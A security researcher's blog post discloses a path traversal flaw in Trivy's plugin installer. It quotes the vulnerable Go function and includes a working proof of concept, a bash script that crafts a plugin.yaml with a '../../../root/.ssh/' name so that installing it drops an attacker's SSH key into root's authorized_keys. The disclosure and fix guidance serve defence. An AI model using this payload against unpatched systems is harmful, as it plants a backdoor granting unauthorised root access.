---
title: 'Trivy: Arbitrary File Write via Path Traversal in Plugin Manager - CVE-2026-63328'
author: Fatih Çelik
date: 2026-07-16 13:00:00 +0300
categories: [Vulnerability Research]
tags: [vulnerability research]
math: true
mermaid: true
description: "Analysis of a path traversal vulnerability in Trivy's plugin manager that allows an attacker to write arbitrary files and potentially achieve code execution."
---

**TL;DR:**

I discovered a path traversal vulnerability in Trivy's plugin manager. If a user is tricked into installing a crafted plugin, an attacker could abuse this flaw to escape the designated plugin directory and overwrite critical files on the system. The issue has been fixed in [Trivy 0.72.0](https://github.com/aquasecurity/trivy/releases/tag/v0.72.0). Here is the [advisory](https://github.com/aquasecurity/trivy/security/advisories/GHSA-8rc5-4fr6-64pw).

## Intro

In this post, I will walk you through a vulnerability I discovered in Trivy's plugin management system. Plugins in Trivy are third-party binaries that Trivy downloads and executes to extend its capabilities. While Trivy's documentation advises installing only trusted plugins, the way it handled plugin metadata had a flaw that could lead to severe consequences if a user is tricked into installing a malicious plugin. The vulnerability allows an attacker to write arbitrary files outside the designated plugin directory. By crafting a malicious plugin, an attacker can overwrite critical system files, such as SSH authorized keys or cron jobs, leading to a complete system compromise. 

At this point, you might be thinking: *"If we already have to trick the user into installing a malicious plugin, why bother exploiting a path traversal? Can't the malicious binary just do whatever it wants?"* It is a fair question, and one might even debate whether this constitutes a vulnerability. However, there is a critical distinction here between **installation** and **execution**. Even if the binary itself were malicious, you wouldn't expect it to compromise your system *just* by running the `trivy plugin install` command. A user or security analyst might install a plugin merely to inspect it, without ever executing it. Yet, because of this path traversal flaw in the `plugin.yaml` parsing, the system is compromised during the installation phase alone. Ideally, we would expect the application to handle the installation process gracefully and prevent any out-of-bounds file writes.



## The Flaw

The root cause of this vulnerability lies in the `pkg/plugin/manager.go` file, specifically within the `loadMetadata()` function. When Trivy installs a plugin, it reads the plugin's metadata from a `plugin.yaml` file. 

Let's take a look at the vulnerable code snippet:

```go
// pkg/plugin/manager.go:333-358
func (m *Manager) loadMetadata(dir string) (Plugin, error) {
    filePath := filepath.Join(dir, configFile)
    f, err := os.Open(filePath)
    if err != nil {
        return Plugin{}, xerrors.Errorf("file open error: %w", err)
    }
    defer f.Close()

    var plugin Plugin
    if err = yaml.NewDecoder(f).Decode(&plugin); err != nil {
        return Plugin{}, xerrors.Errorf("yaml decode error: %w", err)
    }

    if plugin.Name == "" {
        return Plugin{}, xerrors.Errorf("'name' is empty")
    }

    // plugin.Name comes from untrusted YAML
    plugin.dir = filepath.Join(m.pluginRoot, plugin.Name)

    return plugin, nil
}
```

As you can see on line 15, the only validation performed is checking whether `plugin.Name` is empty. There is absolutely no validation against path traversal sequences (like `..`), absolute paths (like `/`), or path separators. 

Because `plugin.Name` is read directly from an untrusted YAML file and used in filesystem path construction, an attacker can manipulate this field to escape the intended `~/.trivy/plugins` directory.

## The Exploit

The attack flow is quite straightforward:

1. The attacker creates a malicious `plugin.yaml` file where the `name` field contains a path traversal sequence.
2. The attacker tricks a user into running `trivy plugin install <malicious-plugin-url>`.
3. Trivy downloads and extracts the archive.
4. The `loadMetadata()` function parses the YAML and sets `plugin.dir` using the malicious name without any sanitization.
5. Trivy then writes the downloaded binary and the `plugin.yaml` file to this out-of-bounds location.

Let's see a PoC to understand how this can be weaponized to drop an SSH backdoor.

**Step 1: Creating the Malicious Plugin**

We create a plugin structure and craft a `plugin.yaml` file that targets the `/root/.ssh/` directory. 

```bash
mkdir exploit-plugin
cd exploit-plugin

# Create malicious plugin.yaml with path traversal
cat > plugin.yaml <<'EOF'
name: "../../../root/.ssh/"
version: "1.0.0"
summary: "Malicious Plugin"
platforms:
  - uri: "./authorized_keys"
    bin: "authorized_keys"
EOF

# Create attacker's SSH public key
echo "ssh-rsa XXXXXXXXXXXXXXXXXX... fatihhcelik.github.io" > authorized_keys

# Package the plugin
tar czf ../evil-plugin.tar.gz plugin.yaml authorized_keys
```

**Step 2: Execution**

The attacker now needs the victim to install this crafted plugin:

```bash
trivy plugin install evil-plugin.tar.gz
```

**Step 3: Verification**

Once installed, Trivy will write the `authorized_keys` file directly into the `/root/.ssh/` directory, allowing the attacker to SSH into the machine!

```bash
cat /root/.ssh/authorized_keys
# Output: ssh-rsa XXXXXXXXXXXXXXXXXX... fatihhcelik.github.io
```

---

While looking at the codebase, I noticed one more interesting thing. The `platform.bin` parameter is also passed directly to the `filepath.Join()` function without any sanitization:

```go
func (p *Plugin) Cmd(ctx context.Context, opts Options) (*exec.Cmd, error) {
	platform, err := p.selectPlatform(ctx, opts)
	if err != nil {
		return nil, xerrors.Errorf("platform selection error: %w", err)
	}

	execFile := filepath.Join(p.Dir(), platform.Bin)
//...
```

I suspect this won't be triggered simply by running the `install` command, but it's definitely another potential path traversal vector worth fixing. I made sure to include this detail in my original report as a side note for the maintainers.

## Conclusion

The vulnerability was patched in **Trivy 0.72.0**, so I highly recommend updating. As always, stick to the official Trivy plugin index and only install plugins from sources you trust.
